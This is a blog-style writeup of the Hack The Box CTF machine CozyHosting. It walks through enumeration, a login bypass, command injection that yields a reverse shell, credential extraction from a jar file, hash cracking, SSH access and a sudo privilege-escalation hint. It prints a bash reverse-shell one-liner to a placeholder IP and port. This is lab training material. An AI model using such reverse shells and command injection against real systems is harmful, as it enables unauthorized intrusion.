---
layout: post
title: "HTB - CozyHosting Writeup"
categories: writeup
tags: linux ctf
---

This writeup is meant to give an overview of the challenge's solution without spoiling too much of the key details so you can still have fun while following it !

# 1. Initial enumeration
First and foremost, as usual for any challenge we can run a simple port scan using nmap:
![](/assets/writeups/CozyHosting/Selection_063.png)

From this we can already see that the target hosts an HTTP server as well as an SSH server, which probably means that our entry point will probably be found in our browser visiting the site related to this IP; and the SSH server might be useful later once we find a login for it.

Visiting the ip from our browser redirects us to a website (dont forget to add this host in your /etc/hosts file):
![](/assets/writeups/CozyHosting/Selection_064.png)

We can quickly see that most links are pointing at the main page, except for the login page:
![](/assets/writeups/CozyHosting/Selection_065.png)

However after testing this page for SQL injections (manually or using a tool like sqlmap), this page doesn't seem vulnerable. We can thus continue our enumeration with some dir busting using gobuster:
![](/assets/writeups/CozyHosting/Selection_066.png)

This gives us a list of pages to visit, one of which seems to hold valuable information:
![](/assets/writeups/CozyHosting/Selection_046.png)

This can be used to bypass the login and access to the admin panel:
![](/assets/writeups/CozyHosting/Selection_045.png)

# 2. Foothold
We gained a first access on the site, we now need a way to execute arbitrary commands on the host.
On the adnmin page we can a function to patch hosts:
![](/assets/writeups/CozyHosting/Selection_067.png)

We can put arbitrary values in both field and then intercept the request with Burp to tinker with it in Repeater. The idea is to find some inputs that would lead to a reverse shell. A payload like this one:
```bash
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
```
should be transformed in a way that will be executed by the request on the server. Using brackets, pipe and a proper encoding you should be able to get a reverse shell from this request!
![](/assets/writeups/CozyHosting/Selection_050.png)

However, at this point we are yet to access a user account, we can only see a home for a user named 'josh'.
A jar file is also present in /app, this file should be downloaded on our machine and extracted to inspect its content and find useful information.

![](/assets/writeups/CozyHosting/Selection_051.png)

The file application.properties contains credentials for a postegres database so we now need a way to access it as it might be our avenue to compromise a user account.

# 3. Gaining access
We now have all the information required to connect to the database:
![](/assets/writeups/CozyHosting/Selection_071.png)

the user table contains two users with a password hash for each of them. Using John the ripper or Hashcat we can easily crack the admin password which is in the rockyou list.
![](/assets/writeups/CozyHosting/Selection_059.png)

We can then use this password as well as the username retrieved earlier to connect to our target using SSH. This gives us access to our user flag !

# 4. Privilege escalation
Privilege escalation on this machine relies on a very common method, often found in easy challenges. Using 'sudo -l' you should have enough information to find which command can be exploited to get root access and open the flag in the /root directory ! (This site can help you find what you are looking for: https://gtfobins.github.io !)

Congratulations !